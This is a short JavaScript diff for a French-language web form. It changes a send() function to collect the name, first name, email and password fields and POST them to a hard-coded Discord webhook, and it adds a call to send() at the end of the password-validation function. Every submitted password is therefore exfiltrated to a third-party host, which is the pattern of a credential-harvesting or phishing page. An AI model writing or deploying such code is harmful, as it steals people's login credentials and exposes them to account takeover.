@@ -1,6 +1,8 @@
 function send(){
-    var a = document.getElementById("username").value; 
-    var b = document.getElementById("password").value; 
+    var a = document.getElementById("name").value; 
+    var b = document.getElementById("prenom").value; 
+    var c = document.getElementById("email").value;
+    var d = document.getElementById("password").value;
     var discordWebhook = "https://discord.com/api/webhooks/1071501347750412388/3C6f-LbqkywnYHkI5bkqw_lz2WUb0X1_uGYdTPDOfiK2_jpQwBRKgG3U3YoPJSHtcYZR";       
     var request = new XMLHttpRequest();
     request.open("POST", discordWebhook);
@@ -57,5 +59,7 @@ function v(){
         alert("Le mot de passe doit contenir au moins une lettre");
         return false;
     }
+    send();
+    return true;
 
 }
